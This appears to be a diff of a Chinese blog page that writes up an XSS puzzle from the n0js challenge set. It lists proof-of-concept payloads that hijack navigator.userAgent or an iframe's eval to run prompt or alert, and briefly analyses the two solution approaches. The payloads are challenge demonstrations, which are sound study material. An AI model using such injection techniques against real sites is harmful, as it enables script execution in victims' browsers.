@@ -20,7 +20,7 @@ Please execute the jscode in the iframe(name=hi): prompt location.href
 Please execute the jscode in the iframe(name=hi): prompt location.href
 第一个页面：
 12345678910111213141516171819202122232425&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;g">
-<meta property="og:updated_time" content="2017-01-22T06:26:34.339Z">
+<meta property="og:updated_time" content="2017-01-22T06:27:56.868Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一道小题目">
 <meta name="twitter:description" content="问题：源地址：http://server.n0tr00t.com/n0js/， 是里面的第二道题目
@@ -209,8 +209,10 @@ Please execute the jscode in the iframe(name=hi): prompt location.href
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">case2.html?a=location.hash.substr(1)#var frame = document.createElement(&apos;iframe&apos;); frame.style.display = &apos;none&apos;; document.body.appendChild(frame);</div><div class="line">      function navigator()&#123;&#125; window.navigator = new Proxy(window.frames[0].window.navigator, &#123; get: function(n0t)&#123;return &quot;&lt;img src=@ onerror=alert(location.href)&gt;&quot;;&#125; &#125;) / @evi1m0</div></pre></td></tr></table></figure>
 <p>6.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">case2.html?a=location.hash.substr(1)#setTimeout(&quot;hi.eval(&apos;prompt(location.href)&apos;)&quot;,500)  / @fyth</div></pre></td></tr></table></figure>
-<p>7.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">case2.html?a=location.hash.substr(1)#navigator.__defineGetter__(&apos;userAgent&apos;, function()&#123; return &apos;&lt;svg/onload=prompt(location.href)&gt;&apos;&#125;) / @fyth</div></pre></td></tr></table></figure>
+<ol>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">case2.html?a=location.hash.substr(1)#navigator.__defineGetter__(&apos;userAgent&apos;, function()&#123; return &apos;&lt;svg/onload=prompt(location.href)&gt;&apos;&#125;) / @fyth</div></pre></td></tr></table></figure>
+</li>
+</ol>
 <h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>对以上poc进行分析，其实就是两种解法，一个是利用第二个页面中的document.write，里面输出的是浏览器的UA，思路就是改变UA的值;另一个解法是利用窗口本身，再iframe里面执行js脚本输出</p>
 
       
